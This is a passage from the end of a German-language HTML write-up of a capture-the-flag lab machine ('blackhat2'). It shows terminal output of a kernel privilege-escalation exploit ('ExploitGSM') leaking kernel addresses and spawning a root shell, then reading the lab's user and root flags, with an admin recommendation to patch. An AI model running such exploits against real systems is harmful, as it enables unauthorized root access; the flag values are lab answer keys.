+                    <div class="prompt" style="color: yellow;">www-data@blackhat2:/tmp$ <span class="command">./ExploitGSM</span></div>
+                     <pre>
+kallsyms restricted, begin retvial kallsyms table 
+detected kernel path-> /boot/vmlinuz-6.1.0-18-amd64 
+detected compressed format -> xz 
+Uncompressed kernel size -> 65902908 
+successfully taken kernel! 
+begin try leak startup_xen! 
+startup_xen leaked address  -> ffffffff8ec6f1c0 
+text leaked address         -> ffffffff8cc00000 
+lockdep_map_size     -> 32 
+spinlock_t_size      -> 4 
+mutex_size           -> 32 
+gsm_mux_event_offset -> 56 
+Let go thread 
+<span class="password">We get root, spawn shell</span> 
+
+<span class="prompt">root@blackhat2:/root#</span> 
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Als `root` werden die Root- und User-Flags gesucht und ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                *   `ls` im Root-Home (`/root`) zeigt `root.txt`.
+                *   `cat root.txt` liest die Root-Flag: `<span class="password">30f55e2f86961a07e3a181a82f602ed6</span>`.
+                *   Wechsel zu `/home`, `ls` zeigt den Benutzer `sml`.
+                *   Wechsel zu `/home/sml`, `ls` zeigt `user.txt`.
+                *   `cat user.txt` liest die User-Flag: `<span class="password">156532dab679edf6f8e53c8787a09264</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beide Flags erfolgreich gefunden. Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> System sichern (Kernel patchen, LFI beheben).</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@blackhat2:/root# <span class="command">ls</span></div>
+                     <pre>
+<span class="command">root.txt</span>
+</pre>
+                    <div class="prompt">root@blackhat2:/root# <span class="command">cat root.txt</span></div>
+                     <pre>
+<span class="password" style="display: block; text-align: center;">30f55e2f86961a07e3a181a82f602ed6</span>
+</pre>
+                    <div class="prompt">root@blackhat2:/root# <span class="command">cd /home/</span></div>
+                     <!-- Keine Ausgabe -->
+                    <div class="prompt">root@blackhat2:/home# <span class="command">ls</span></div>
+                     <pre>
+<span class="command">sml</span>
+</pre>
+                    <div class="prompt">root@blackhat2:/home# <span class="command">cd sml/</span></div>
+                     <!-- Keine Ausgabe -->
+                    <div class="prompt">root@blackhat2:/home/sml# <span class="command">ls</span></div>
+                     <pre>
+<span class="command">user.txt</span>
+</pre>
+                    <div class="prompt">root@blackhat2:/home/sml# <span class="command">cat user.txt</span></div>
+                     <pre>
+<span class="password" style="display: block; text-align: center;">156532dab679edf6f8e53c8787a09264</span>
+</pre>
+                  </div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                <div class="code-block"><center>
+                    <div class="terminal">
+                        <span class="command">cat /home/sml/user.txt</span> <br>
+                        <span class="flag-content"><span class="password">156532dab679edf6f8e53c8787a09264</span></span>
+                    </div>
+                </center></div>
+
+                <div class="code-block"><center>
+                    <div class="terminal">
+                        <span class="command">cat /root/root.txt</span> <br>
+                        <span class="flag-content"><span class="password">30f55e2f86961a07e3a181a82f602ed6</span></span>
+                    </div>
+                 </center></div>
+            </div>
+        </section>
+
+    </div> <!-- Ende .container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2. Mai 2024</p> <!-- Datum aus Nmap/Nikto-Scan entnommen -->
+    </footer>
+</body>
+</html>
